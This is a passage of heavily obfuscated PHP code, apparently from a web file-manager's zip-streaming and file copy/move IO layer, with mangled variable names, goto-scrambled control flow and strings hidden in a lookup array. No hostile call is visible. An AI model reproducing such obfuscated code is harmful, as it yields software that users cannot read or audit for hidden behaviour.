array($Añ·îª´Í–[1914], 4294967295), array($Añ·îª´Í–[1915], strlen($B×¾’Ì¾š™))); goto AáçÑ‰Ê¡; a³ æ«Æèä: } protected function addCdr() { foreach ($this->files as $DáÅŒØàß) { $this->addCdrFile($DáÅŒØàß); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $Döé±–”Ÿô =& $_SERVER[÷ÖêïÔÔÓ]; $E’ƒµ…¨ª = $Döé±–”Ÿô[199]; if ($this->outputName) { $BÌ³õÜÛÄ = trim(str_replace(array($Döé±–”Ÿô[112], $Döé±–”Ÿô[55], $Döé±–”Ÿô[94], $Döé±–”Ÿô[68], $Döé±–”Ÿô[214], $Döé±–”Ÿô[715]), $Döé±–”Ÿô[33], $this->outputName)); $fÖôÆÖ‹ÄŸ = rawurlencode($BÌ³õÜÛÄ); $E’ƒµ…¨ª .= "\x3b\x20\x66\x69\x6c\145\x6e\x61\x6d\145\x2a\x3d\x75\164\146\55\x38\x27\x27{$fÖôÆÖ‹ÄŸ}"; } $bÙ‡Ô¼†™ = array($Döé±–”Ÿô[196] => $Döé±–”Ÿô[1917], $Döé±–”Ÿô[1918] => $E’ƒµ…¨ª, $Döé±–”Ÿô[1919] => $Döé±–”Ÿô[1920], $Döé±–”Ÿô[1921] => $Döé±–”Ÿô[1922], $Döé±–”Ÿô[1923] => $Döé±–”Ÿô[1924]); foreach ($bÙ‡Ô¼†™ as $f£êÈàÙÍ => $FÏåÂìÓõ­) { header($f£êÈàÙÍ . $Döé±–”Ÿô[876] . $FÏåÂìÓõ­); } } protected function send($DÄÈŸŒŠ½‡) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $DÄÈŸŒŠ½‡); } protected final function dosTime($Fßİ©Ëäš¹) { $d‹–‰†îò =& $_SERVER[÷ÖêïÔÔÓ]; $BÁˆƒÈ›¬¼ = getdate($Fßİ©Ëäš¹); if ($BÁˆƒÈ›¬¼[$d‹–‰†îò[1624]] < 1980) { $BÁˆƒÈ›¬¼ = array($d‹–‰†îò[1624] => 1980, $d‹–‰†îò[1925] => 1, $d‹–‰†îò[1926] => 1, $d‹–‰†îò[1927] => 0, $d‹–‰†îò[1928] => 0, $d‹–‰†îò[1929] => 0); } $BÁˆƒÈ›¬¼[$d‹–‰†îò[1624]] -= 1980; return $BÁˆƒÈ›¬¼[$d‹–‰†îò[1624]] << 25 | $BÁˆƒÈ›¬¼[$d‹–‰†îò[1925]] << 21 | $BÁˆƒÈ›¬¼[$d‹–‰†îò[1926]] << 16 | $BÁˆƒÈ›¬¼[$d‹–‰†îò[1927]] << 11 | $BÁˆƒÈ›¬¼[$d‹–‰†îò[1928]] << 5 | $BÁˆƒÈ›¬¼[$d‹–‰†îò[1929]] >> 1; } protected function packFields($D¶Ñ˜’É­) { $AºÍ‚Ä‡¸ =& $_SERVER[÷ÖêïÔÔÓ]; $B‰ê°˜Ø = $AºÍ‚Ä‡¸[33]; $BØòµÃ£³ = array(); foreach ($D¶Ñ˜’É­ as $BÇ‡ÏâÚŞ) { $B‰ê°˜Ø .= $BÇ‡ÏâÚŞ[0]; $BØòµÃ£³[] = $BÇ‡ÏâÚŞ[1]; } array_unshift($BØòµÃ£³, $B‰ê°˜Ø); return call_user_func_array($AºÍ‚Ä‡¸[1930], $BØòµÃ£³); } protected function filterFilename($aˆ…ƒ“ÒÊÊ) { $Ašñîß‰»å =& $_SERVER[÷ÖêïÔÔÓ]; return str_replace(array($Ašñîß‰»å[94], $Ašñîß‰»å[4], $Ašñîß‰»å[173], $Ašñîß‰»å[70], $Ašñîß‰»å[112], $Ašñîß‰»å[921], $Ašñîß‰»å[924], $Ašñîß‰»å[268]), $Ašñîß‰»å[71], $aˆ…ƒ“ÒÊÊ); } } class ZipStream { } goto eˆœÆÊˆ°à; bˆ³¡˜¶â–: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($CŸòŞˆ½, $C¼˜ÛèÛ¯˜) { $Cíñ—ßöÇ® = self::driverMake($C¼˜ÛèÛ¯˜[0]); if (method_exists($Cíñ—ßöÇ®, $CŸòŞˆ½)) { return @call_user_func_array(array($Cíñ—ßöÇ®, $CŸòŞˆ½), $C¼˜ÛèÛ¯˜); } if (method_exists($Cíñ—ßöÇ®, $_SERVER[÷ÖêïÔÔÓ][969])) { return @call_user_func_array(array($Cíñ—ßöÇ®, $CŸòŞˆ½), $C¼˜ÛèÛ¯˜); } else { if (method_exists(self, $CŸòŞˆ½)) { return @call_user_func_array(array(self, $CŸòŞˆ½), $C¼˜ÛèÛ¯˜); } else { call_user_func_array(array(parent, $CŸòŞˆ½), $C¼˜ÛèÛ¯˜); } } } public static function init($A¢É¢¢î¡é) { return self::driverMake($A¢É¢¢î¡é); } public static function copy($dÊöØ¥¼öĞ, $e„ºæ·²µ, $bìºòÜÜ—½ = false, $f„¹ç¥œ¿ = false) { return self::copyMove($dÊöØ¥¼öĞ, $e„ºæ·²µ, $bìºòÜÜ—½, $_SERVER[÷ÖêïÔÔÓ][482], $f„¹ç¥œ¿); } public static function move($f¶—÷‘ºÓœ, $fšÇ¤æ¿‹Î, $Bë¡Æäİ = false, $aĞç‘—¿Ì† = false) { return self::copyMove($f¶—÷‘ºÓœ, $fšÇ¤æ¿‹Î, $Bë¡Æäİ, $_SERVER[÷ÖêïÔÔÓ][484], $aĞç‘—¿Ì†); } public static function saveFile($B‡Ğ÷«‡¸¥, $EŞ¤‹ó‹¯Ï, $a© ´‡¨ª = true) { goto E¦©ÜİÈ‘; C¡Ù™èŠÁà: $E‚„ ·ÙÎ· = self::driverMake($EŞ¤‹ó‹¯Ï); $fñÛºÃë¤‹ = !1; if ($E‚„ ·ÙÎ·->pathParse[$a‹Ë™Óµ£[970]]) { $DŠË‡·÷”— = $E‚„ ·ÙÎ·->pathParse[$a‹Ë™Óµ£[970]]; $fñÛºÃë¤‹ = $E‚„ ·ÙÎ·; $E‚„ ·ÙÎ· = self::driverMake($DŠË‡·÷”—); } goto cîÓŠøÌµ; E¦©ÜİÈ‘: $a‹Ë™Óµ£ =& $_SERVER[÷ÖêïÔÔÓ]; $E®ŒÆù— = self::info($EŞ¤‹ó‹¯Ï); $DÂñğÇíë = self::driverMake($B‡Ğ÷«‡¸¥); goto C¡Ù™èŠÁà; cîÓŠøÌµ: $FÎóÅ¤ëğÚ = $E‚„ ·ÙÎ·->pathFather($EŞ¤‹ó‹¯Ï); $bëéëö¼º = !0; if (!$a© ´‡¨ª && self::driverIsSame($DÂñğÇíë, $E‚„ ·ÙÎ·)) { $bëéëö¼º = !1; } goto b®ÁßÕöˆ; b®ÁßÕöˆ: $bùİèÏÇŠ = self::copyFile($DÂñğÇíë, $B‡Ğ÷«‡¸¥, $E‚„ ·ÙÎ·, $FÎóÅ¤ëğÚ, $E®ŒÆù—[$a‹Ë™Óµ£[28]], $bëéëö¼º); if ($fñÛºÃë¤‹) { $bùİèÏÇŠ = $fñÛºÃë¤‹->getPathOuter($bùİèÏÇŠ); } return $bùİèÏÇŠ; goto Aê×·ŠÕ¼; Aê×·ŠÕ¼: } private static function copyMove($B‹„æ‘†©Õ, $côØø“ÆÎÓ, $B®¥…Ùô²ˆ, $EÌ¸«˜¨¢Ä, $c‘×ºÓ»İ = false) { goto cêÃå”×İÈ; b¿†ñ¢±íÓ: if ($CŒ¦Ç–ñæ÷) { $c‚Í¾»ÃÁ = $CŒ¦Ç–ñæ÷->getPathOuter($c‚Í¾»ÃÁ); } return $c‚Í¾»ÃÁ; goto DÕ®á¶àËâ; cêÃå”×İÈ: $Dƒ£°½¦îÉ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$B‹„æ‘†©Õ || $B‹„æ‘†©Õ == $Dƒ£°½¦îÉ[8] || !$côØø“ÆÎÓ) { return !1; } ignore_timeout(); goto f‹†šÔÆ¦Å; f‹†šÔÆ¦Å: $böŞŸª¾‘ = self::driverMake($B‹„æ‘†©Õ); $Fà…ŒğÈöÓ = self::driverMake($côØø“ÆÎÓ); $F¬¨ÉŠÏ²œ = $EÌ¸«˜¨¢Ä == $Dƒ£°½¦îÉ[484]; goto b¹ŒÄ§ëßä; b¹ŒÄ§ëßä: $CŒ¦Ç–ñæ÷ = !1; if ($Fà…ŒğÈöÓ->pathParse[$Dƒ£°½¦îÉ[970]]) { $côØø“ÆÎÓ = $Fà…ŒğÈöÓ->pathParse[$Dƒ£°½¦îÉ[970]]; $CŒ¦Ç–ñæ÷ = $Fà…ŒğÈöÓ; $Fà…ŒğÈöÓ = self::driverMake($côØø“ÆÎÓ); } self::check($böŞŸª¾‘, $B‹„æ‘†©Õ, $Fà…ŒğÈöÓ, $côØø“ÆÎÓ); goto FŠªŠ¶‚÷; FŠªŠ¶‚÷: Hook::trigger($Dƒ£°½¦îÉ[73], $böŞŸª¾‘, $B‹„æ‘†©Õ, $Fà…ŒğÈöÓ, $côØø“ÆÎÓ); $E‰ËºÜ¾â¤ = self::driverIsSame($böŞŸª¾‘, $Fà…ŒğÈöÓ); if ($E‰ËºÜ¾â¤) { if ($EÌ¸«˜¨¢Ä == $Dƒ£°½¦îÉ[484] && trim($côØø“ÆÎÓ, $Dƒ£°½¦îÉ[8]) == trim($Fà…ŒğÈöÓ->pathFather($B‹„æ‘†©Õ), $Dƒ£°½¦îÉ[8])) { return $Fà…ŒğÈöÓ->getPathOuter($B‹„æ‘†©Õ); } if (method_exists($Fà…ŒğÈöÓ, $EÌ¸«˜¨¢Ä)) { return $Fà…ŒğÈöÓ->{$EÌ¸«˜¨¢Ä}($B‹„æ‘†©Õ, $côØø“ÆÎÓ, $B®¥…Ùô²ˆ); } } goto Bºê¥±‚«ğ; Bºê¥±‚«ğ: $dçªİÖ… Õ = $böŞŸª¾‘->isFile($B‹„æ‘†©Õ); if (!$dçªİÖ… Õ && $Fà…ŒğÈöÓ->getType() == $Dƒ£°½¦îÉ[680] && $böŞŸª¾‘->getType() == $Dƒ£°½¦îÉ[102]) { $c‚Í¾»ÃÁ = $Fà…ŒğÈöÓ->copyFolderFromIO($böŞŸª¾‘, $B‹„æ‘†©Õ, $côØø“ÆÎÓ, $B®¥…Ùô²ˆ, $F¬¨ÉŠÏ²œ, $c‘×ºÓ»İ); } else { $c‚Í¾»ÃÁ = self::copyPath($böŞŸª¾‘, $B‹„æ‘†©Õ, $Fà…ŒğÈöÓ, $côØø“ÆÎÓ, $B®¥…Ùô²ˆ, $F¬¨ÉŠÏ²œ, $dçªİÖ… Õ, $c‘×ºÓ»İ); } if ($c‚Í¾»ÃÁ && $F¬¨ÉŠÏ²œ) { $böŞŸª¾‘->remove($B‹„æ‘†©Õ); } goto b¿†ñ¢±íÓ; DÕ®á¶àËâ: } private static function check($fáºÌÍŒ¢», $B¾´¡Ê¤©, $AÕ¨»Ú‡Òº, &$bšÙÕ¿ ¤) { $e’Ÿ¶š¼š =& $_SERVER[÷ÖêïÔÔÓ]; if (self::driverIsSame($fáºÌÍŒ¢», $AÕ¨»Ú‡Òº) && $fáºÌÍŒ¢»->isFolder($B¾´¡Ê¤©) && $fáºÌÍŒ¢»->isParentOf($B¾´¡Ê¤©, $bšÙÕ¿ ¤)) { show_json(LNG($e’Ÿ¶š¼š[971]), !1); } if (!$fáºÌÍŒ¢»->exist($B¾´¡Ê¤©)) { show_json(LNG($e’Ÿ¶š¼š[101]), !1); } } private static function copyPath($Eá˜Ì‘‘°¬, $f‡Ú´›ö¹š, $F¸ªøÚ·Ò, $CÊñ±ËŠ’, $F–Å‘·­‘Ş, $Fî¼ßöÉ…Æ, $fÛÅ×Šà¼, $FÔÖä»‡˜ = false) { goto CÖ…ÌÅêªØ; aÓÎŠŞ‹ª¡: $E‡Ìà¬°Ã = $F¸ªøÚ·Ò->mkdir($F¸ªøÚ·Ò->getPath($aÔ”©¶¼ºö)); $CÊñ±ËŠ’ = $F¸ªøÚ·Ò->getPathInner($E‡Ìà¬°Ã); $CÛ²Ñ®Òã = $Eá˜Ì‘‘°¬->listPath($f‡Ú´›ö¹š, !0); goto aëçŒˆ·İ; aëçŒˆ·İ: $fÒ»ßÚ‚Ú… = array_merge($CÛ²Ñ®Òã[$aÂÅ…©¤ŒÒ[74]], $CÛ²Ñ®Òã[$aÂÅ…©¤ŒÒ[75]]); foreach ($fÒ»ßÚ‚Ú… as $a†ëùÓÎ“Î) { $a˜ŠË‹ò¸Ş = $a†ëùÓÎ“Î[$aÂÅ…©¤ŒÒ[29]] == $aÂÅ…©¤ŒÒ[164]; $f‡Ú´›ö¹š = $Eá˜Ì‘‘°¬->getPathInner($a†ëùÓÎ“Î[$aÂÅ…©¤ŒÒ[76]]); $bÔñ·™Ÿ‡ = self::copyPath($Eá˜Ì‘‘°¬, $f‡Ú´›ö¹š, $F¸ªøÚ·Ò, $CÊñ±ËŠ’, $F–Å‘·­‘Ş, $Fî¼ßöÉ…Æ, $a˜ŠË‹ò¸Ş); if (!$bÔñ·™Ÿ‡) { write_log($aÂÅ…©¤ŒÒ[972] . $f‡Ú´›ö¹š . $aÂÅ…©¤ŒÒ[973] . $CÊñ±ËŠ’, $aÂÅ…©¤ŒÒ[974]); } } return $E‡Ìà¬°Ã; goto B½‰Œ—äŠ; CÖ…ÌÅêªØ: $aÂÅ…©¤ŒÒ =& $_SERVER[÷ÖêïÔÔÓ]; $EÃ¥Š˜¥Æ“ = $FÔÖä»‡˜ ? $FÔÖä»‡˜ : $Eá˜Ì‘‘°¬->getPathName($Eá˜Ì‘‘°¬->pathThis($f‡Ú´›ö¹š)); if ($F–Å‘·­‘Ş) { $b†‹²¾î—± = $F¸ªøÚ·Ò->fileNameExist($CÊñ±ËŠ’, $EÃ¥Š˜¥Æ“); $EÃ¥Š˜¥Æ“ = $F¸ªøÚ·Ò->fileNameAuto($CÊñ±ËŠ’, $EÃ¥Š˜¥Æ“, $F–Å‘·­‘Ş, !$fÛÅ×Šà¼); $F–Å‘·­‘Ş = $b†‹²¾î—± ? $F–Å‘·­‘Ş : !1; } goto D¥îÔ¢§»; D¥îÔ¢§»: if ($fÛÅ×Šà¼) { return self::copyFile($Eá˜Ì‘‘°¬, $f‡Ú´›ö¹š, $F¸ªøÚ·Ò, $CÊñ±ËŠ’, $EÃ¥Š˜¥Æ“, $Fî¼ßöÉ…Æ); } if ($F–Å‘·­‘Ş == REPEAT_RENAME_FOLDER) { $F–Å‘·­‘Ş = !1; } $aÔ”©¶¼ºö = rtrim($CÊñ±ËŠ’, $aÂÅ…©¤ŒÒ[8]) . $aÂÅ…©¤ŒÒ[8] . $EÃ¥Š˜¥Æ“; goto aÓÎŠŞ‹ª¡; B½‰Œ—äŠ: } private static function copyFile($aéäˆ¡ÚÆµ, $F¹èŠç®¤‹, $E”êÂë¬‚ƒ, $c‡Í’‡˜ˆ, $Dô·±¤øá, $Bˆ¾¼ï—À) { goto aëéî¬ÙÓ; eµç¸Âà—ç: mk_dir($Eó†»çñÑ½); $Cáøƒ–½°ñ = $Eó†»çñÑ½ . $dõºÙ¦ë‚Š; $Cáøƒ–½°ñ = $aéäˆ¡ÚÆµ->download($F¹èŠç®¤‹, $Cáøƒ–½°ñ); goto f§æëÔµ†•; f§æëÔµ†•: $Cáøƒ–½°ñ = $aéäˆ¡ÚÆµ->iconvApp($Cáøƒ–½°ñ); $fŞÈ‘Š®î = $E”êÂë¬‚ƒ->upload($c‡Í’‡˜ˆ, $Cáøƒ–½°ñ, $Bˆ¾¼ï—À); self::remove($Eó†»çñÑ½ . $dõºÙ¦ë‚Š); goto Cõ‘ìà ƒù; aëéî¬ÙÓ: $cïÍ‚‹öÄÀ =& $_SERVER[÷ÖêïÔÔÓ]; $c‡Í’‡˜ˆ = $E”êÂë¬‚ƒ->getPath(rtrim($c‡Í’‡˜ˆ, $cïÍ‚‹öÄÀ[8]) . $cïÍ‚‹öÄÀ[8] . $Dô·±¤øá); $dõºÙ¦ë‚Š = $cïÍ‚‹öÄÀ[975] . time() . rand_string(5); goto A‡®ªí‰¤á; A‡®ªí‰¤á: Hook::trigger($cïÍ‚‹öÄÀ[976], $aéäˆ¡ÚÆµ, $F¹èŠç®¤‹, $E”êÂë¬‚ƒ, $c‡Í’‡˜ˆ, $Dô·±¤øá, $dõºÙ¦ë‚Š); if (self::driverIsSame($aéäˆ¡ÚÆµ, $E”êÂë¬‚ƒ)) { if ($Bˆ¾¼ï—À) { $fŞÈ‘Š®î = $E”êÂë¬‚ƒ->moveFile($F¹èŠç®¤‹, $c‡Í’‡˜ˆ); } else { $fŞÈ‘Š®î = $E”êÂë¬‚ƒ->copyFile($F¹èŠç®¤‹, $c‡Í’‡˜ˆ); } Hook::trigger($cïÍ‚‹öÄÀ[977], $aéäˆ¡ÚÆµ, $F¹èŠç®¤‹, $E”êÂë¬‚ƒ, $c‡Í’‡˜ˆ, $Dô·±¤øá, $fŞÈ‘Š®î); return $fŞÈ‘Š®î; } $Eó†»çñÑ½ = TEMP_FILES; goto eµç¸Âà—ç; Cõ‘ìà ƒù: Hook::trigger($cïÍ‚‹öÄÀ[977], $aéäˆ¡ÚÆµ, $F¹èŠç®¤‹, $E”êÂë¬‚ƒ, $c‡Í’‡˜ˆ, $Dô·±¤øá, $fŞÈ‘Š®î); return $fŞÈ‘Š®î; goto a”µòìšƒ; a”µòìšƒ: } public static function pathFather($FšÅ½™´µ) { $eò©´©ÇÂ = IO::init($FšÅ½™´µ); $dó‘­ÓĞ = $eò©´©ÇÂ->pathFather($eò©´©ÇÂ->path); return $eò©´©ÇÂ->getPathOuter($dó‘­ÓĞ); } public static function fileOut($dÌàõĞÉä, $dÔ¥¬‰É = false, $b½¹ˆÇä© = false, $Eù«à““†± = '') { $BĞ§ã½‡å =& $_SERVER[÷ÖêïÔÔÓ]; $dƒè©ÛÈæ = self::driverMake($dÌàõĞÉä); if ($GLOBALS[$BĞ§ã½‡å[6]][$BĞ§ã½‡å[84]][$BĞ§ã½‡å[978]]) { return $dƒè©ÛÈæ->fileOutServer($dÌàõĞÉä, $dÔ¥¬‰É, $b½¹ˆÇä©, $Eù«à““†±); } return $dƒè©ÛÈæ->fileOut($dÌàõĞÉä, $dÔ¥¬‰É, $b½¹ˆÇä©, $Eù«à““†±); } public static function fileOutImage($cå¦Œ´»ÇÎ, $DÚİÓ‹ãÖŸ = 250) { $C¯²´”ïä§ =& $_SERVER[÷ÖêïÔÔÓ]; $a„‹¦óŸø = array(250, 1200, 3000); for ($bÂë£¼¢ŠÄ = 0; $bÂë£¼¢ŠÄ < count($a„‹¦óŸø); $bÂë£¼¢ŠÄ++) { if ($bÂë£¼¢ŠÄ == 0 && $DÚİÓ‹ãÖŸ <= $a„‹¦óŸø[$bÂë£¼¢ŠÄ]) { $DÚİÓ‹ãÖŸ = $a„‹¦óŸø[$bÂë£¼¢ŠÄ]; break; } else { if ($DÚİÓ‹ãÖŸ > $a„‹¦óŸø[$bÂë£¼¢ŠÄ - 1] && $DÚİÓ‹ãÖŸ <= $a„‹¦óŸø[$bÂë£¼¢ŠÄ]) { $DÚİÓ‹ãÖŸ = $a„‹¦óŸø[$bÂë£¼¢ŠÄ]; break; } else { if ($bÂë£¼¢ŠÄ == count($a„‹¦óŸø) - 1 && $DÚİÓ‹ãÖŸ > $a„‹¦óŸø[$bÂë£¼¢ŠÄ]) { $DÚİÓ‹ãÖŸ = $a„‹¦óŸø[$bÂë£¼¢ŠÄ]; break; } } } } $CÎ…ùÁ—Ää = self::driverMake($cå¦Œ´»ÇÎ); if ($GLOBALS[$C¯²´”ïä§[6]][$C¯²´”ïä§[84]][$C¯²´”ïä§[978]]) { return $CÎ…ùÁ—Ää->fileOutImageServer($cå¦Œ´»ÇÎ, $DÚİÓ‹ãÖŸ); } return $CÎ…ùÁ—Ää->fileOutImage($cå¦Œ´»ÇÎ, $DÚİÓ‹ãÖŸ); } private static function driverIsSame($BÀ¥êğ÷Ô, $FæØ³ƒÍÌ) { goto fåÕ·Š­Ñæ; fåÕ·Š­Ñæ: $CßâÛ‹¨¸ö =& $_SERVER[÷ÖêïÔÔÓ]; $BÆÎ½·à = $BÀ¥êğ÷Ô->getType(); $eïŸµ¶ÔŸ = $FæØ³ƒÍÌ->getType(); goto AœØªÄ®Í; AœØªÄ®Í: if ($BÆÎ½·à != $eïŸµ¶ÔŸ) { return !1; } if ($BÆÎ½·à == $CßâÛ‹¨¸ö[680]) { return !0; } if ($BÆÎ½·à == $CßâÛ‹¨¸ö[102]) { return !0; } goto dßÚÑ·ÌË; dßÚÑ·ÌË: if ($BÀ¥êğ÷Ô->pathDriver == $FæØ³ƒÍÌ->pathDriver) { return !0; } return !1; goto c¯¸©‚²öÑ; c¯¸©‚²öÑ: } public static function copyUpdate($e¥õÕæÉŞ, $Cõ˜…°†ğ¦) { goto EËº‘Öì«Ú; fÕïˆñóí½: $dí×±ÌÓÇÆ = self::_listAll($e¥õÕæÉŞ); $d‡‹†³–‚ = self::_listAll($Cõ˜…°†ğ¦); $aŠø‡ˆ£¯ê = array(); goto FçÍ±ª‡©õ; EËº‘Öì«Ú: $c¤´›¯¸¼ =& $_SERVER[÷ÖêïÔÔÓ]; if (!IO::exist($e¥õÕæÉŞ)) { return !1; } if (!IO::exist($Cõ˜…°†ğ¦)) { IO::mkdir($Cõ˜…°†ğ¦); } goto fÕïˆñóí½; FçÍ±ª‡©õ: $A†Šœ„Ÿ§± = array(); foreach ($dí×±ÌÓÇÆ as $dø‘”Û¤Ü => $BÍÆ½íÖÆ) { if ($BÍÆ½íÖÆ[$c¤´›¯¸¼[77]] == 1 && !isset($d‡‹†³–‚[$dø‘”Û¤Ü])) { $A†Šœ„Ÿ§±[] = $Cõ˜…°†ğ¦ . $c¤´›¯¸¼[8] . $dø‘”Û¤Ü; } if ($BÍÆ½íÖÆ[$c¤´›¯¸¼[77]] == 0) { if (!isset($d‡‹†³–‚[$dø‘”Û¤Ü]) || $d‡‹†³–‚[$dø‘”Û¤Ü][$c¤´›¯¸¼[78]] != $BÍÆ½íÖÆ[$c¤´›¯¸¼[78]]) { $aŠø‡ˆ£¯ê[] = array($c¤´›¯¸¼[979] => $BÍÆ½íÖÆ[$c¤´›¯¸¼[76]], $c¤´›¯¸¼[980] => $Cõ˜…°†ğ¦ . $c¤´›¯¸¼[8] . get_path_father($dø‘”Û¤Ü), $c¤´›¯¸¼[981] => $BÍÆ½íÖÆ); if (isset($d‡‹†³–‚[$dø‘”Û¤Ü])) { IO::remove($Cõ˜…°†ğ¦ . $c¤´›¯¸¼[8] . $dø‘”Û¤Ü); } } } } $E–Åìí™Òø = array($c¤´›¯¸¼[164] => $aŠø‡ˆ£¯ê, $c¤´›¯¸¼[77] => $A†Šœ„Ÿ§±); goto aóçöá‚Í; aóçöá‚Í: Hook::trigger($c¤´›¯¸¼[982], $e¥õÕæÉŞ, $Cõ˜…°†ğ¦, $E–Åìí™Òø); foreach ($A†Šœ„Ÿ§± as $BÍÆ½íÖÆ) { IO::mkdir($BÍÆ½íÖÆ); } foreach ($aŠø‡ˆ£¯ê as $BÍÆ½íÖÆ) { IO::copy($BÍÆ½íÖÆ[$c¤´›¯¸¼[979]], $BÍÆ½íÖÆ[$c¤´›¯¸¼[980]], REPEAT_REPLACE); } goto C»¨÷÷¥ñ; C»¨÷÷¥ñ: } private static function _listAll($b³‹‹Å¾ñâ) { $A˜›ö‹ƒŠ‚ =& $_SERVER[÷ÖêïÔÔÓ]; $b³‹‹Å¾ñâ = KodIO::clear($b³‹‹Å¾ñâ); $b„®Şîã”ù = IO::listAll($b³‹‹Å¾ñâ); foreach ($b„®Şîã”ù as &$c¸ˆÌ†óÇ) { $EÅÑ±§²éÔ = substr($c¸ˆÌ†óÇ[$A˜›ö‹ƒŠ‚[76]], strlen($b³‹‹Å¾ñâ)); $c¸ˆÌ†óÇ[$A˜›ö‹ƒŠ‚[983]] = trim($EÅÑ±§²éÔ, $A˜›ö‹ƒŠ‚[8]); } return array_to_keyvalue($b„®Şîã”ù, $A˜›ö‹ƒŠ‚[983]); } public static function fileSubstr($cŠÏ¨ªĞ, $AÇ¶¤­ëŠ¸, $f‰ó½Îø¶ = false) { goto E…¢Ä²â¥£; bÂîñŞÁ­¥: if ($AÇ¶¤­ëŠ¸ + $f‰ó½Îø¶ > $DàßÚå¨ğ¨) { $f‰ó½Îø¶ = $DàßÚå¨ğ¨ - $AÇ¶¤­ëŠ¸; } if ($f‰ó½Îø¶ <= 0) { return $_SERVER[÷ÖêïÔÔÓ][33]; } if ($AÇ¶¤­ëŠ¸ < 0 || $AÇ¶¤­ëŠ¸ >= $DàßÚå¨ğ¨ || $f‰ó½Îø¶ > 1024 * 1024 * 5) { throw new Exception("\x66\151\x6c\x65\122\x65\141\144\x20\145\162\162\x6f\x72\x21\x20\x73\x74\141\x72\x74\75{$AÇ¶¤­ëŠ¸}\73\154\145\156\x67\164\x68\x3d{$f‰ó½Îø¶}\x3b\40\163\151\x7a\145\x3d{$DàßÚå¨ğ¨}\x3b"); } goto Bì’Ì¹ˆ÷¡; BË‰‘¬±ò: $E¥¦Èø¥œ¨ = $f‰ó½Îø¶; if ($AÇ¶¤­ëŠ¸ < 0) { $AÇ¶¤­ëŠ¸ = $DàßÚå¨ğ¨ + $AÇ¶¤­ëŠ¸; } if ($f‰ó½Îø¶ === !1) { $f‰ó½Îø¶ = $DàßÚå¨ğ¨ - $AÇ¶¤­ëŠ¸; } goto bÂîñŞÁ­¥; Bì’Ì¹ˆ÷¡: return $c¹†ÂâØÌ¬->fileSubstr($cŠÏ¨ªĞ, $AÇ¶¤­ëŠ¸, $f‰ó½Îø¶); goto dÊ…ÁÚŠ“; E…¢Ä²â¥£: $c¹†ÂâØÌ¬ = self::driverMake($cŠÏ¨ªĞ); $DàßÚå¨ğ¨ = $c¹†ÂâØÌ¬->size($cŠÏ¨ªĞ); $a–©‡ÖÊĞå = $AÇ¶¤­ëŠ¸; goto BË‰‘¬±ò; dÊ…ÁÚŠ“: } private static function driverMake(&$dÔ‚¼‚‹¶°) { goto D…ÔïñÜô; D…ÔïñÜô: $CéëÔ›ôá =& $_SERVER[÷ÖêïÔÔÓ]; $dŞ™…â½Öå = KodIO::parse($dÔ‚¼‚‹¶°); if (!self::$driverListSystem) { $d‘ğİ¢Åà÷ = Model($CéëÔ›ôá[690])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($d‘ğİ¢Åà÷, $CéëÔ›ôá[364]); } goto F˜ä£š; B£”Ê»œ©: return $A£¼¹¦áì; goto Dô­½ëÁÂ; F˜ä£š: if ($dŞ™…â½Öå[$CéëÔ›ôá[29]] == KodIO::KOD_IO && !self::$driverListSystem[$dŞ™…â½Öå[$CéëÔ›ôá[364]]]) { return !1; } $dÔ‚¼‚‹¶° = $dŞ™…â½Öå[$CéëÔ›ôá[984]]; $A£¼¹¦áì = self::driverGet($dŞ™…â½Öå, $dÔ‚¼‚‹¶°); goto B£”Ê»œ©; Dô­½ëÁÂ: } private static function driverGet($CÜ¤ªæˆ‚œ, &$bÇ‡¬åßª†) { goto AéÆ†‹¹ƒÔ; AéÆ†‹¹ƒÔ: $b·ï–Ô±ÑÌ =& $_SERVER[÷ÖêïÔÔÓ]; $fŠ‘Ô›ß™Å = $CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[985]]; $E¸¼£±ñ• = $CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[364]]; goto d¼áÀù—“ã; c¬ÑŞÕÓí¨: $Dæ£Ü‹™†Ø = self::$driverCache[$fÕƒ¤á”îÏ]; $Dæ£Ü‹™†Ø->pathDriver = $fŠ‘Ô›ß™Å; $Dæ£Ü‹™†Ø->pathBase = $b·ï–Ô±ÑÌ[33]; goto Bó±¹¡å¹; f¨÷¿Ö‚: $Dæ£Ü‹™†Ø->path = $bÇ‡¬åßª†; return $Dæ£Ü‹™†Ø; goto c§¦Ş° ÆÈ; d¼áÀù—“ã: switch ($CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[29]]) { case KodIO::KOD_IO: $bÔÅñâ… = self::$driverListSystem[$E¸¼£±ñ•]; break; case KodIO::KOD_SOURCE: $bÇ‡¬åßª† = $E¸¼£±ñ• . $bÇ‡¬åßª†; $bÔÅñâ… = array($b·ï–Ô±ÑÌ[986] => $b·ï–Ô±ÑÌ[987], $b·ï–Ô±ÑÌ[6] => $CÜ¤ªæˆ‚œ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $BÓ‰¬œŞš = $GLOBALS[$b·ï–Ô±ÑÌ[988]]; self::$driverListUser = array_to_keyvalue($BÓ‰¬œŞš, $b·ï–Ô±ÑÌ[364]); } $bÔÅñâ… = self::$driverListUser[$E¸¼£±ñ•]; break; case KodIO::KOD_SHARE_LINK: $bÔÅñâ… = array($b·ï–Ô±ÑÌ[986] => $b·ï–Ô±ÑÌ[989], $b·ï–Ô±ÑÌ[6] => $CÜ¤ªæˆ‚œ); $d¼¬”¶³öŞ = Action($b·ï–Ô±ÑÌ[990])->sharePathInfo($CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[76]]); $bÇ‡¬åßª† = $d¼¬”¶³öŞ[$b·ï–Ô±ÑÌ[366]]; if (!$d¼¬”¶³öŞ[$b·ï–Ô±ÑÌ[366]]) { $e‰ÚÌ¼šÍ = Model($b·ï–Ô±ÑÌ[528])->getInfo($d¼¬”¶³öŞ[$b·ï–Ô±ÑÌ[437]]); $bÇ‡¬åßª† = KodIO::clear($e‰ÚÌ¼šÍ[$b·ï–Ô±ÑÌ[991]] . $CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[984]]); 